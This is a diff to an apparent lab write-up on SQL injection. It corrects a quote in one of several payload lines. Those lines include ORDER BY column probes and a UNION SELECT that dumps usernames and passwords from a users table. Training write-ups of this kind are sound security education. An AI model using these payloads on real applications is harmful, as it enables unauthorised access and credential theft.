@@ -30,7 +30,7 @@ In this lab, the target is `users` table, specifically the credentials for the `
 **Discovery Steps**:
 
 - `'ORDER BY 2 -- ` (Resulted in `200 OK`) vs `'ORDER BY 3 -- ` (Resulted in `500 Error`) confirmed a 2 column table.
-- `'UNION SELECT 'asif-probe', 'asif-probe --` confirmed both the column to be string-compatible.
+- `'UNION SELECT 'asif-probe', 'asif-probe' --` confirmed both the column to be string-compatible.
 - `'UNION SELECT username, password FROM users --` was used to dump all user credentials.
 
 ---
